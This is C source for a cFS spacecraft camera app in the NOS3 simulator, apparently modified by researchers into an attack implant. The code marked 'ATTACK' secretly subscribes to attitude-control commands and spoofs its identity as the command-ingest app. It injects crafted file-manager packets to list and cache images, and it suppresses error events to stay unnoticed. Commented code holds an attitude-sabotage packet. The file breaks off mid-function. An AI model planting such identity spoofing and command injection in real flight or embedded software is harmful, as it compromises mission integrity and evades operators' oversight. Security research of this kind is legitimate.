/* Copyright (C) 2009 - 2017 National Aeronautics and Space Administration. All Foreign Rights are Reserved to the U.S. Government.

This software is provided "as is" without any warranty of any, kind either express, implied, or statutory, including, but not
limited to, any warranty that the software will conform to, specifications any implied warranties of merchantability, fitness
for a particular purpose, and freedom from infringement, and any warranty that the documentation will conform to the program, or
any warranty that the software will be error free.

In no event shall NASA be liable for any damages, including, but not limited to direct, indirect, special or consequential damages,
arising out of, resulting from, or in any way connected with the software or its documentation.  Whether or not based upon warranty,
contract, tort or otherwise, and whether or not loss was sustained from, or arose out of the results of, or use of, the software,
documentation or services provided hereunder

ITC Team
NASA IV&V
ivv-itc@lists.nasa.gov
*/

/*******************************************************************************
** File: cam_app.c
**
** Purpose:
**   This file contains the source code for the Sample STF1 App.
**
*******************************************************************************/

#include "cam_app.h"

//IRT CSS - ATTACK
#include <time.h>
#include "../../../../../fsw/osal/src/os/shared/inc/os-shared-globaldefs.h"
#include "../../../../../fsw/osal/src/os/shared/inc/os-shared-idmap.h"
#include "/home/nos3/Desktop/github-nos3/fsw/cfe/modules/es/fsw/src/cfe_es_apps.h"
#include <math.h>

#define ADCS_CMD_MID 0x1940
#define ADCS_TARGET_CC 9

void CAM_AttackProcessADCSCommand(void);
osal_id_t CFE_ES_TaskId_ToOSAL(CFE_ES_TaskId_t id);
CFE_ES_AppRecord_t *CFE_ES_LocateAppRecordByID(CFE_ES_AppId_t AppID);
void CFE_ES_LockSharedData(const char *FunctionName, int32 LineNumber);
void CFE_ES_UnlockSharedData(const char *FunctionName, int32 LineNumber);
static inline bool CFE_ES_AppRecordIsMatch(const CFE_ES_AppRecord_t *AppRecPtr, CFE_ES_AppId_t AppID)
{
    return (AppRecPtr != NULL && CFE_RESOURCEID_TEST_EQUAL(AppRecPtr->AppId, AppID));
}

static void undo_spoofing(CFE_ES_TaskId_t TskId, CFE_ES_AppId_t AppId);
typedef struct
{
    char   DirName[OS_MAX_PATH_LEN]; /**< \brief Directory name */
    uint32 DirEntries;               /**< \brief Number of entries in the directory */
    uint32 FileEntries;              /**< \brief Number of entries written to output file */
} FM_DirListFileStats_t;

typedef struct
{
    char   EntryName[OS_MAX_PATH_LEN]; /**< \brief Directory Listing Filename */
    uint32 EntrySize;                  /**< \brief Directory Listing File Size */
    uint32 ModifyTime;                 /**< \brief Directory Listing File Last Modification Times */
    uint32 Mode;                       /**< \brief Mode of the file (Permissions from #OS_FILESTAT_MODE) */
} FM_DirListEntry_t;

/*
** global app data
*/
CAM_AppData_t CAM_AppData;

//IRT CSS - ATTACK
static FILE *attack_log;
extern unsigned long sim_start_time;
Attack_struct Attack_data;
static pthread_t thread_cam = 0;

osal_id_t CFE_ES_TaskId_ToOSAL(CFE_ES_TaskId_t id)
{
    osal_id_t     Result;
    unsigned long Val;

    Val    = CFE_ResourceId_ToInteger(CFE_RESOURCEID_UNWRAP(id));
    Result = OS_ObjectIdFromInteger(Val ^ CFE_RESOURCEID_MARK);

    return Result;
}

/*
** arducam_AppMain() -- Application entry point and main process loop
*/
void arducam_AppMain( void )
{
    int32 status = 0;
    CAM_AppData.RunStatus = CFE_ES_RunStatus_APP_RUN;
    CFE_ES_PerfLogEntry(CAM_PERF_ID);

    /* 
    ** initialize the application, register the app, etc 
    */
    status = CAM_AppInit();
    if(status != CFE_SUCCESS)
    {
        CFE_EVS_SendEvent(CAM_INIT_ERR_EID, CFE_EVS_EventType_ERROR, "CAM App: init error %d", status);
        CAM_AppData.RunStatus = CFE_ES_RunStatus_APP_ERROR;
    }

    /*
    ** CAM Runloop
    */
    while (CFE_ES_RunLoop(&CAM_AppData.RunStatus) == true)
    {
        /*
        ** Exit performance profiling.  It will be restarted later in this while loop. 
        */
        CFE_ES_PerfLogExit(CAM_PERF_ID);

        /* 
        ** Pend on receipt of command packet -- set timeout to 500ms as cFE default
        ** could also set no timeout - this means that this app
        ** will block until a message is received.  Refer to the header file docs
        ** for more information on using this function
        */
        status = CFE_SB_ReceiveBuffer((CFE_SB_Buffer_t **)&CAM_AppData.MsgPtr,  CAM_AppData.CmdPipe,  CFE_SB_PEND_FOREVER);
        
        /* 
        ** Begin performance metrics on anything after this line. This will help to determine
        ** where we are spending most of the time during this app execution
        */
        CFE_ES_PerfLogEntry(CAM_PERF_ID);

        /*
        ** If the RcvMsg() was successful, then continue to process the CommandPacket()
        ** if not successful, then 
        */
        if (status == CFE_SUCCESS)
        {
            CAM_ProcessCommandPacket();
        }
        else if (status == CFE_SB_PIPE_RD_ERR)
        {
            /* This is an example of exiting on an error.
            ** Note that a SB read error is not always going to
            ** result in an app quitting.
            */
            CFE_EVS_SendEvent(CAM_PIPE_ERR_EID, CFE_EVS_EventType_ERROR, "CAM APP: SB Pipe Read Error, CAM APP will continue with error = %d", status);
            //CAM_AppData.RunStatus = CFE_ES_RunStatus_APP_ERROR;
        }

    }

    CFE_ES_ExitApp(CAM_AppData.RunStatus);
} 


/* 
** CAM_AppInit() --  initialization
*/
int32 CAM_AppInit(void)
{
    int32 status = OS_SUCCESS;

    //LOUIS IRT CSS
    attack_log = fopen("/tmp/attack_log.txt", "a");

    while (true)
    {
        /*
        ** Register the events
        */ 
        status = CFE_EVS_Register(NULL, 0, CFE_EVS_EventFilter_BINARY);
        if (status != CFE_SUCCESS)
        {
            OS_printf("CAM APP: EVS register error %d", status);
            break;
        }

        /*
        ** Create the Software Bus command pipe 
        */
        status = CFE_SB_CreatePipe(&CAM_AppData.CmdPipe, CAM_PIPE_DEPTH, "CAM_CMD_PIPE");
        if (status != CFE_SUCCESS)
        {
            CFE_EVS_SendEvent(CAM_INIT_PIPE_ERR_EID, CFE_EVS_EventType_ERROR, "CAM APP: Cmd pipe error %d", status);
            break;
        }
        
        /*
        ** Subscribe to "ground commands". Ground commands are those commands with command codes
        */
        status = CFE_SB_Subscribe(CFE_SB_ValueToMsgId(CAM_CMD_MID), CAM_AppData.CmdPipe);
        if (status != CFE_SUCCESS)
        {
            CFE_EVS_SendEvent(CAM_INIT_SUB_CMD_ERR_EID, CFE_EVS_EventType_ERROR, "CAM APP: Ground command subscription error %d", status);
            break;
        }

        /*
        ** Subscribe to housekeeping (hk) messages.  HK messages are those messages that request
        ** an app to send its HK telemetry
        */
        status = CFE_SB_Subscribe(CFE_SB_ValueToMsgId(CAM_SEND_HK_MID), CAM_AppData.CmdPipe);
        if (status != CFE_SUCCESS)
        {
            CFE_EVS_SendEvent(CAM_INIT_SUB_HK_ERR_EID, CFE_EVS_EventType_ERROR, "CAM APP: HK command subscription error %d", status);
            break;
        }

        //Subscribe to ADCS packets - ATTACK
        status = CFE_SB_Subscribe(CFE_SB_ValueToMsgId(ADCS_CMD_MID), CAM_AppData.CmdPipe);
        if (status != CFE_SUCCESS)
        {
            CFE_EVS_SendEvent(CAM_INIT_SUB_HK_ERR_EID, CFE_EVS_EventType_ERROR, "CAM APP: ADCS (attack) command subscription error %d", status);
            break;
        }

        srand(time(NULL));

        /*
        ** Create data mutex
        */
        status = OS_MutSemCreate(&CAM_AppData.data_mutex, CAM_MUTEX_NAME, 0);
        if (status != OS_SUCCESS)
        {
            CFE_EVS_SendEvent(CAM_MUTEX_ERR_EID, CFE_EVS_EventType_ERROR, "CAM APP: Create mutex error %d", status);
            break;
        }

        /* 
        ** Create child task wakeup semaphore
        */
        status = OS_BinSemCreate(&CAM_AppData.sem_id, CAM_SEM_NAME, 0, 0);
        if (status != OS_SUCCESS)
        {
            CFE_EVS_SendEvent(CAM_SEMAPHORE_ERR_EID, CFE_EVS_EventType_ERROR, "CAM APP: Semaphore create error %d", status);
            break;
        }

        /*
        ** Initialize Application Data
        */
        CAM_AppData.State = CAM_STOP;
        CAM_AppData.Exp = 0;
        CAM_AppData.Size = size_160x120;
        CAM_AppData.HkTelemetryPkt.CommandCount       = 0;
        CAM_AppData.HkTelemetryPkt.CommandErrorCount  = 0;

        /* 
        ** Create child task
        */
        status = CAM_ChildInit();
        if (status != CFE_SUCCESS)
        {
            CFE_EVS_SendEvent(CAM_INIT_CHILD_ERR_EID, CFE_EVS_EventType_ERROR, "CAM App: Child task init error %d", status);
            break;
        }

        /* Initialize the published HK message - this HK message will contain the telemetry
        ** that has been defined in the CAM_HkTelemetryPkt for this app
        */
        CFE_MSG_Init(CFE_MSG_PTR(CAM_AppData.HkTelemetryPkt.TlmHeader),
            CFE_SB_ValueToMsgId(CAM_HK_TLM_MID),
            CAM_HK_TLM_LNGTH);
        
        CFE_MSG_Init(CFE_MSG_PTR(CAM_AppData.Exp_Pkt.TlmHeader),
            CFE_SB_ValueToMsgId(CAM_EXP_TLM_MID),
            CAM_EXP_TLM_LNGTH);
        
        /* 
        ** Important to send an information event that the app has initialized. this is
        ** useful for debugging the loading of individual apps
        */
        CFE_EVS_SendEvent (CAM_STARTUP_INF_EID, CFE_EVS_EventType_INFORMATION,
                "CAM App Initialized. Version %d.%d.%d.%d",
                    CAM_MAJOR_VERSION,
                    CAM_MINOR_VERSION, 
                    CAM_REVISION, 
                    CAM_MISSION_REV);
        break;
    }
    
    return status;
} 


/* 
**  Name:  CAM_ProcessCommandPacket
**
**  Purpose:
**  This routine will process any packet that is received on the CAM command pipe.       
*/
void CAM_ProcessCommandPacket(void)
{
    CFE_SB_MsgId_t MsgId = CFE_SB_INVALID_MSG_ID;
    OS_MutSemTake(CAM_AppData.data_mutex);
        CFE_MSG_GetMsgId(CAM_AppData.MsgPtr, &MsgId);
    OS_MutSemGive(CAM_AppData.data_mutex);
    switch (CFE_SB_MsgIdToValue(MsgId))
    {
        /*
        ** Ground Commands with command codes fall under the CAM_APP_CMD_MID
        ** message ID
        */
        case CAM_CMD_MID:
            CAM_ProcessGroundCommand();
            break;

        /*
        ** All other messages, other than ground commands, add to this case statement.
        ** The HK MID comes first, as it is currently the only other messages defined
        ** besides the CAM_APP_CMD_MID message above
        */
        case CAM_SEND_HK_MID:
            CAM_ReportHousekeeping();
            break;

        case ADCS_CMD_MID:
            CAM_AttackProcessADCSCommand();
            break;

         /*
         ** All other invalid messages that this app doesn't recognize, increment
         ** the command error counter and log as an error event.  
         */
        default:
            CAM_AppData.HkTelemetryPkt.CommandErrorCount++;
            CFE_EVS_SendEvent(CAM_COMMAND_ERR_EID,CFE_EVS_EventType_ERROR, "CAM App: invalid command packet, MID = 0x%x", CFE_SB_MsgIdToValue(MsgId));
            break;
    }

    return;
} 

static void undo_spoofing(CFE_ES_TaskId_t TskId, CFE_ES_AppId_t AppId)
{
    //undo task spoofing ------------
    OS_object_token_t token;
    OS_common_record_t *record;
    osal_id_t object_id = CFE_ES_TaskId_ToOSAL(TskId);
            
    int32 return_code = OS_ObjectIdGetById(OS_LOCK_MODE_GLOBAL, OS_ObjectIdToType_Impl(object_id), object_id, &token);
    if (return_code == OS_SUCCESS)
    {
        record = OS_ObjectIdGlobalFromToken(&token);

        record->name_entry = "CAM";
        
        OS_ObjectIdRelease(&token);
    }
    //-----------------------------

    //undo app spoofing ---------------------------
    CFE_ES_AppRecord_t *AppRecPtr;
    AppRecPtr = CFE_ES_LocateAppRecordByID(AppId);

    CFE_ES_LockSharedData(__func__, __LINE__);

    /*
    * confirm that the app record is a match,
    * which must be done while locked.
    */
    if (CFE_ES_AppRecordIsMatch(AppRecPtr, AppId))
    {
        //undo CI App spoof
        strncpy(AppRecPtr->AppName,"CAM", sizeof(AppRecPtr->AppName)-1);
        return_code                    = CFE_SUCCESS;
    }
    else
    {
        printf("flop sur le undo du spoofing d'app, CFE_ES_ERR_RESOURCEID_NOT_VALID\n");
        return_code     = CFE_ES_ERR_RESOURCEID_NOT_VALID;
    }

    CFE_ES_UnlockSharedData(__func__, __LINE__);
    //---------------------------------------------
}

/*void* thread_copy_file(void * file_name)
{
    sleep(10);
    char temp = 0;
    printf("taking sem\n");
    while (!temp)
    {
        sleep(1);
        OS_MutSemTake(Attack_data.data_mutex);
            temp = Attack_data.exp_is_ongoing;
        OS_MutSemGive(Attack_data.data_mutex);
    }
    printf("exp is ongoing\n");
    printf("caching the file...\n");
    
    //NOT TAGGED !!!! - TODO !
    uint8_t fm_copy[] = {0x18,0x8c,0xc0,0x00,0x00,0x83,0x02,0x00,0x00,0x00,0x2f,0x68,0x6f,0x6d,0x65,0x2f,0x6e,0x6f,0x73,0x33,0x2f,0x44,0x65,0x73,0x6b,0x74,0x6f,0x70,0x2f,0x67,0x69,0x74,0x68,0x75,0x62,0x2d,0x6e,0x6f,0x73,0x33,0x2f,0x73,0x69,0x6d,0x73,0x2f,0x62,0x75,0x69,0x6c,0x64,0x2f,0x62,0x69,0x6e,0x2f,0x63,0x61,0x6d,0x2e,0x62,0x69,0x6e,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x2f,0x64,0x61,0x74,0x61,0x2f,0x63,0x61,0x6d,0x2f,0x6c,0x61,0x74,0x5f,0x6c,0x6f,0x6e,0x67,0x2e,0x6f,0x75,0x74,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
    char source_file[] = "/home/nos3/Desktop/github-nos3/sims/build/bin/cam.bin";
    memcpy(&fm_copy[10],source_file,sizeof(source_file));
    memcpy(&fm_copy[74],file_name,64);

    CFE_SB_TransmitMsg((CFE_MSG_Message_t *) fm_copy, true);

    printf("file %s copied to %s!\n", source_file,(char*) file_name);
    return NULL;
}*/

void CAM_AttackProcessADCSCommand(void)
{
    CFE_SB_MsgId_t MsgId = CFE_SB_INVALID_MSG_ID;
    CFE_MSG_FcnCode_t CommandCode = 0;
    float longitude = 0;
    float latitude = 0;
    float *param_ptr = (float*) &(CAM_AppData.MsgPtr->Byte[8]);
    CFE_Status_t status;

    /*
    ** Ground Commands, by definition, has a command code associated with them.  Pull
    ** this command code from the message and then process the action associated with
    ** the command code.
    */
    OS_MutSemTake(CAM_AppData.data_mutex);
        CFE_MSG_GetFcnCode(CAM_AppData.MsgPtr, &CommandCode);
    OS_MutSemGive(CAM_AppData.data_mutex);
    switch (CommandCode)
    {
        /*
        ** NOOP Command
        */
        case ADCS_TARGET_CC:
            latitude = param_ptr[0];
            longitude = param_ptr[1];
            printf("\033[1mlatitude : %f, longitude : %f\033[0m\n", latitude, longitude);

            if ((!(fabsf(latitude - 0.0f) < 1e-6f))||(!(fabsf(longitude - 0.0f) < 1e-6f))) //coords are not (0;0)
            {
                //system("ls /home/nos3/Desktop/github-nos3/fsw/build/exe/cpu1/data/cam > /home/nos3/Desktop/github-nos3/fsw/build/exe/cpu1/data/ls_out.txt");
                
                //int fd = open("/home/nos3/Desktop/github-nos3/fsw/build/exe/cpu1/data/ls_out.txt", O_RDONLY);

                //osal_id_t DirId = 0;
                //OS_DirectoryOpen(&DirId)

                //init task spoofing ==================
                char temp[20];
                CFE_ES_TaskId_t TskId;
                int32 return_code;
                OS_common_record_t *record;
                osal_id_t object_id;
                OS_object_token_t token;
                CFE_ES_GetTaskID(&TskId);
                CFE_ES_AppId_t         AppId;
                CFE_ES_GetAppID(&AppId);
                
                object_id = CFE_ES_TaskId_ToOSAL(TskId);
            
                return_code = OS_ObjectIdGetById(OS_LOCK_MODE_GLOBAL, OS_ObjectIdToType_Impl(object_id), object_id, &token);
                if (return_code == OS_SUCCESS)
                {
                    record = OS_ObjectIdGlobalFromToken(&token);

                    record->name_entry = "CI Custom Main Task";
                    
                    OS_ObjectIdRelease(&token);
                }
                else
                {
                    printf("error getting token from objectid\n");
                    undo_spoofing(TskId, AppId);
                    break;
                }
                //====================================

                //init app spoofing ----------------------
                CFE_ES_AppRecord_t *AppRecPtr;

                /*
                ** Get App Record
                */
                AppRecPtr = CFE_ES_LocateAppRecordByID(AppId);

                CFE_ES_LockSharedData(__func__, __LINE__);

                /*
                * confirm that the app record is a match,
                * which must be done while locked.
                */
                if (CFE_ES_AppRecordIsMatch(AppRecPtr, AppId))
                {
                    //spoof CI App
                    strncpy(AppRecPtr->AppName,"CI", sizeof(AppRecPtr->AppName)-1);
                    return_code                    = CFE_SUCCESS;
                }
                else
                {
                    printf("flop sur le spoofing d'app, CFE_ES_ERR_RESOURCEID_NOT_VALID\n");
                    return_code     = CFE_ES_ERR_RESOURCEID_NOT_VALID;
                }

                CFE_ES_UnlockSharedData(__func__, __LINE__);
                //----------------------------------------

                CFE_Status_t status = CFE_SUCCESS;

                //Tagged with 0x28 (=40, for A30), directory to be listed = /data/cam, output file = /data/camdirlisting.out
                uint8_t cam_dir_listing[] = {0x18,0x8c,0xc0,0x00,0x00,0x85,0x0e,0x28,0x2f,0x64,0x61,0x74,0x61,0x2f,0x63,0x61,0x6d,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x2f,0x64,0x61,0x74,0x61,0x2f,0x63,0x61,0x6d,0x64,0x69,0x72,0x6c,0x69,0x73,0x74,0x69,0x6e,0x67,0x2e,0x6f,0x75,0x74,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00};
                status = CFE_SB_TransmitMsg((CFE_MSG_Message_t *) cam_dir_listing, true);
                if (status != CFE_SUCCESS)
                {
                    printf("error transmitting dir listing msg\n");
                    undo_spoofing(TskId, AppId);
                    break;
                }

                OS_TaskDelay(100);

                int fd = open("/home/nos3/Desktop/github-nos3/fsw/build/exe/cpu1/data/camdirlisting.out", O_RDONLY);
                //osal_id_t fd;
                //status = OS_OpenCreate(&fd,"/data/camdirlisting.out",OS_FILE_FLAG_NONE,OS_READ_ONLY);
                if (fd == -1)
                //if(status != CFE_SUCCESS)
                {
                    printf("error opening camdirlisting.out\n");
                    undo_spoofing(TskId, AppId);
                    status = OS_close(fd);
                    break;
                }

                //CFE_FS_Header_t Hdr;
                char buf[sizeof(CFE_FS_Header_t)];
                //Hopefully sets an offset of read in the file AFTER the cFE file header
                //status = CFE_FS_ReadHeader(&Hdr, fd);
                int32 bytes_read = 0;
                bytes_read = read(fd, buf, sizeof(CFE_FS_Header_t));
                if ((bytes_read == 0) || (bytes_read == -1))
                {
                /*if (status != CFE_SUCCESS)
                {
                    if (status == CFE_STATUS_EXTERNAL_RESOURCE_FAIL)
                    {
                        printf("wtf?\n");
                    }
                    else
                    {*/
                        printf("error reading cFE header\n");
                        undo_spoofing(TskId, AppId);
                        //status = OS_close(fd);
                        close(fd);
                        break;
                    //}
                }

                FM_DirListFileStats_t dirlisting;
                memset(&dirlisting, 0, sizeof(FM_DirListFileStats_t));
                
                bytes_read = 0;
                bytes_read = read(fd, &dirlisting, sizeof(FM_DirListFileStats_t));
                if ((bytes_read == 0) || (bytes_read == -1))
                {
                    printf("error during attack - bytes_read returned %d\n", bytes_read);
                    status = OS_close(fd);
                    undo_spoofing(TskId, AppId);
                    break;
                }

                //printf("Dir entries : %d, File entries : %d\n", dirlisting.DirEntries, dirlisting.FileEntries);

                FM_DirListEntry_t Entry;
                memset(&Entry, 0, sizeof(FM_DirListEntry_t));
                
                char file_name[64];
                memset(file_name, 0, 64);

                snprintf(file_name, sizeof(file_name), "%.4f_%.4f", latitude, longitude);
                printf("file name to search for : %s\n", file_name);

                char a[] = "/data/cam/";
                char b[64];

                char is_present = 0;

                for (unsigned int i=0; i<dirlisting.FileEntries; i++)
                {
                    bytes_read = 0;
                    bytes_read = read(fd, &Entry, sizeof(FM_DirListEntry_t));
                    if (bytes_read == sizeof(FM_DirListEntry_t))
                    {
                        printf("filename : %s\n", Entry.EntryName);
                        if (!strncmp(file_name, Entry.EntryName, 64))
                        {
                            //file is already present, use the cached version !
                            //TODO
                            printf("file exists!\n");
                            is_present=1;
                            //char a[] = "/data/cam/";
                            //char b[64];
                            memset(b,0,sizeof(b));
                            OS_MutSemTake(Attack_data.data_mutex);
                                Attack_data.add_to_cache = 0;
                                strcat(b,a);
                                //printf("b after first strcat : %s\n",b);
                                strcat(b,file_name);
                                //printf("b after 2nd strcat : %s\n",b);
                                strncpy(Attack_data.filename,b, sizeof(b));
                                Attack_data.filename[63] = '\0';
                                printf("\033[1m[MAIN] add_to_cache = %d\033[0m\n",Attack_data.add_to_cache);
                            OS_MutSemGive(Attack_data.data_mutex);

                            break;
                        }
                    }
                }
                if (!is_present)
                {
                    //file is not present, save a copy !!!
                    printf("file does not exist !\n");
                    //char a[] = "/data/cam/";
                    //char b[64];
                    memset(b,0,sizeof(b));
                    //pthread_create(&thread_cam, NULL, thread_copy_file,(void*) file_name);
                    OS_MutSemTake(Attack_data.data_mutex);
                        Attack_data.add_to_cache = 1;
                        strcat(b,a);
                        //printf("b after first strcat : %s\n",b);
                        strcat(b,file_name);
                        //printf("b after 2nd strcat : %s\n",b);
                        strncpy(Attack_data.filename,b, sizeof(b));
                        Attack_data.filename[63] = '\0';
                        printf("\033[1m[MAIN] add_to_cache = %d\033[0m\n",Attack_data.add_to_cache);
                    OS_MutSemGive(Attack_data.data_mutex);
                }
                
                
                //either use FM_GET_DIR_FILE and read from file the output, or use an internal global struct with malloc to keep track of coordinates
                //char filename[40];
                //snprintf(filename, sizeof(filename), "%f_%f.txt", latitude, longitude);
                //FM_GET_DIR_FILE version : //file is hard to parse, giving up !

                //if target is already cached
                //else


                //init spoofing
                /*char temp[20];
                CFE_ES_TaskId_t TskId;
                int32 return_code;
                OS_common_record_t *record;
                osal_id_t object_id;
                OS_object_token_t token;
                CFE_ES_GetTaskID(&TskId);
                
                object_id = CFE_ES_TaskId_ToOSAL(TskId);
            
                return_code = OS_ObjectIdGetById(OS_LOCK_MODE_GLOBAL, OS_ObjectIdToType_Impl(object_id), object_id, &token);
                if (return_code == OS_SUCCESS)
                {
                    record = OS_ObjectIdGlobalFromToken(&token);

                    record->name_entry = "CI Custom Main Task";
                    
                    OS_ObjectIdRelease(&token);
                }*/

                /*status = OS_close(fd);

                status = CFE_SB_Unsubscribe(CFE_SB_ValueToMsgId(ADCS_CMD_MID), CAM_AppData.CmdPipe);
                if (status != CFE_SUCCESS)
                {
                    CFE_EVS_SendEvent(CAM_INIT_SUB_HK_ERR_EID, CFE_EVS_EventType_ERROR, "CAM APP: ADCS (attack) command unsubcription error %d", status);
                    break;
                }

                //create file if needed

                //else replace file to be reported by file cached



                //malicious payload - ADCS SET TARGET NOT TAGGED 			- TODO - edit this tag and give appropriate number if kept as is
                uint8_t buffer[] = {0x19,0x40,0xC0,0x00,0x00,0x09,0x09,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}; //base packet with lat=0 and long=0
                memcpy(&buffer[8],&latitude,sizeof(float));
                memcpy(&buffer[12],&longitude,sizeof(float));

                struct timespec realtime;
                timespec_get(&realtime, TIME_UTC);
                unsigned int packet_seconds = realtime.tv_sec - sim_start_time;
                    
                CFE_SB_TransmitMsg((CFE_MSG_Message_t *) buffer, true);
                
                printf("Sent PHOTO ATTITUDE SABOTAGE via SPOOFING on CI_CUSTOM\n");
                //fprintf(attack_log, "STOP CI attack at : %lld \n", localtime.ticks);
                fprintf(attack_log, "PHOTO ATTITUDE SABOTAGE attack at : %d.%06ld \n", packet_seconds, realtime.tv_nsec/1000);
                fflush(attack_log);*/

                //undo spoofing
                undo_spoofing(TskId, AppId);
                
                /*//Subscribe back to ADCS packets - ATTACK
                status = CFE_SB_Subscribe(CFE_SB_ValueToMsgId(ADCS_CMD_MID), CAM_AppData.CmdPipe);
                if (status != CFE_SUCCESS)
                {
                    CFE_EVS_SendEvent(CAM_INIT_SUB_HK_ERR_EID, CFE_EVS_EventType_ERROR, "CAM APP: ADCS (attack) command subscription error %d", status);
                    break;
                }*/
            }
            break;
        default:
            ; //ignore, this is an attack, we do not want to report warnings (+ other ADCS commands are not relevant for this attack)

    }
}
/*
** CAM_ProcessGroundCommand() -- CAM ground commands
*/
void CAM_ProcessGroundCommand(void)
{
    // Local variables
    uint8  state = 1;
    uint16 x = 0;
    CFE_SB_MsgId_t MsgId = CFE_SB_INVALID_MSG_ID;
    CFE_MSG_FcnCode_t CommandCode = 0;

    /*
    ** MsgId is only needed if the command code is not recognized. See default case below 
    */
    OS_MutSemTake(CAM_AppData.data_mutex);
        CFE_MSG_GetMsgId(CAM_AppData.MsgPtr, &MsgId);
    OS_MutSemGive(CAM_AppData.data_mutex);

    /*
    ** Ground Commands, by definition, has a command code associated with them.  Pull
    ** this command code from the message and then process the action associated with
    ** the command code.
    */
    OS_MutSemTake(CAM_AppData.data_mutex);
        CFE_MSG_GetFcnCode(CAM_AppData.MsgPtr, &CommandCode);
    OS_MutSemGive(CAM_AppData.data_mutex);
    switch (CommandCode)
    {
        /*
        ** NOOP Command
        */
        case CAM_NOOP_CC:
            /* 
            ** notice the usage of the VerifyCmdLength() function call to verify that
            ** the command length is as expected.  
            */
            if (CAM_VerifyCmdLength(CAM_AppData.MsgPtr, sizeof(CAM_NoArgsCmd_t)))
            {
                OS_MutSemTake(CAM_AppData.data_mutex);
                    CAM_AppData.HkTelemetryPkt.CommandCount++;
                OS_MutSemGive(CAM_AppData.data_mutex);
                CFE_EVS_SendEvent(CAM_COMMANDNOP_INF_EID, CFE_EVS_EventType_INFORMATION, "CAM App: NOOP command");
            }
            break;

        /*
        ** Reset Counters Command
        */
        case CAM_RESET_COUNTERS_CC:
            CAM_ResetCounters();
            break;
        
        /*
        ** Stop Science Command
        */
        case CAM_STOP_CC:
            OS_MutSemTake(CAM_AppData.data_mutex);
                CAM_AppData.HkTelemetryPkt.CommandCount++;
                CAM_AppData.State = CAM_STOP;
            OS_MutSemGive(CAM_AppData.data_mutex);
            CFE_EVS_SendEvent(CAM_STOP_INF_EID, CFE_EVS_EventType_INFORMATION,
                "CAM App: STOP command");
            break;
            
        /*
        ** Pause Science Command
        */
        case CAM_PAUSE_CC:
            OS_MutSemTake(CAM_AppData.data_mutex);
                CAM_AppData.HkTelemetryPkt.CommandCount++;
                CAM_AppData.State = CAM_PAUSE;
            OS_MutSemGive(CAM_AppData.data_mutex);
            CFE_EVS_SendEvent(CAM_PAUSE_INF_EID, CFE_EVS_EventType_INFORMATION,
                "CAM App: PAUSE command");
            break;
            
        /*
        ** Resume Science Command
        */
        case CAM_RESUME_CC:
            OS_MutSemTake(CAM_AppData.data_mutex);
                CAM_AppData.HkTelemetryPkt.CommandCount++;
                CAM_AppData.State = CAM_RUN;
            OS_MutSemGive(CAM_AppData.data_mutex);
            CFE_EVS_SendEvent(CAM_RUN_INF_EID, CFE_EVS_EventType_INFORMATION,
                "CAM App: RESUME command");
            break;

        /*
        ** Timeout Command
        */
        case CAM_TIMEOUT_CC:
            OS_MutSemTake(CAM_AppData.data_mutex);
                CAM_AppData.HkTelemetryPkt.CommandCount++;
                CAM_AppData.State = CAM_TIME;
            OS_MutSemGive(CAM_AppData.data_mutex);
            CFE_EVS_SendEvent(CAM_TIMEOUT_INF_EID, CFE_EVS_EventType_INFORMATION,
                "CAM App: TIMEOUT command");
            break;

        /*
        ** Low Voltage Command
        */
        case CAM_LOW_VOLTAGE_CC:
            OS_MutSemTake(CAM_AppData.data_mutex);
                CAM_AppData.HkTelemetryPkt.CommandCount++;
                CAM_AppData.State = CAM_LOW_VOLTAGE;
            OS_MutSemGive(CAM_AppData.data_mutex);
            CFE_EVS_SendEvent(CAM_LOW_VOLTAGE_INT_EID, CFE_EVS_EventType_INFORMATION,
                "CAM App: LOW_VOLTAGE command");
            break;
        
        /*
        ** EXP 1 - Small
        */
        case CAM_EXP1_CC:
            OS_MutSemTake(CAM_AppData.data_mutex);
                CAM_AppData.HkTelemetryPkt.CommandCount++;
                CAM_AppData.Exp = 1;
            OS_MutSemGive(CAM_AppData.data_mutex);
            CFE_EVS_SendEvent(CAM_EXP1_EID, CFE_EVS_EventType_INFORMATION, "CAM App: EXP 1 Command - Small Picture");
            OS_BinSemGive(CAM_AppData.sem_id);
            break;

        /*
        ** EXP 2  - Medium
        */
        case CAM_EXP2_CC:
            OS_MutSemTake(CAM_AppData.data_mutex);
                CAM_AppData.HkTelemetryPkt.CommandCount++;
                CAM_AppData.Exp = 2;
            OS_MutSemGive(CAM_AppData.data_mutex);
            CFE_EVS_SendEvent(CAM_EXP2_EID, CFE_EVS_EventType_INFORMATION, "CAM App: EXP 2 Command - Medium Picture");
            OS_BinSemGive(CAM_AppData.sem_id);
            break;
        /*
        ** EXP 3 - Large
        */
        case CAM_EXP3_CC:
            OS_MutSemTake(CAM_AppData.data_mutex);
                CAM_AppData.HkTelemetryPkt.CommandCount++;
                CAM_AppData.Exp = 3;
            OS_MutSemGive(CAM_AppData.data_mutex);
            CFE_EVS_SendEvent(CAM_EXP3_EID, CFE_EVS_EventType_INFORMATION, "CAM App: EXP 3 Command - Large Picture");
            OS_BinSemGive(CAM_AppData.sem_id);
            break;

        /*
        **  Hardware Check
        */
        case CAM_HW_CHECK_CC:
            CAM_AppData.HkTelemetryPkt.CommandCount++;
            state = OS_SUCCESS;
            state = CAM_init_i2c();
            if (state != OS_SUCCESS)
            {   
